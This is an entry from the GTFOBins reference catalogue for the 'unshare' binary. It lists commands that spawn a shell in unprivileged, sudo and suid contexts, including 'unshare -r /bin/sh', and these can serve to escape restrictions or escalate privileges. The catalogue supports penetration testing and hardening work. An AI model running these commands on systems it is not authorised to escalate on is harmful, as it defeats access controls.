<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/unshare -->
---
functions:
  shell:
  - code: |-
      unshare /bin/sh
    contexts:
      sudo:
      suid:
        code: |-
          unshare -r /bin/sh
      unprivileged:
...
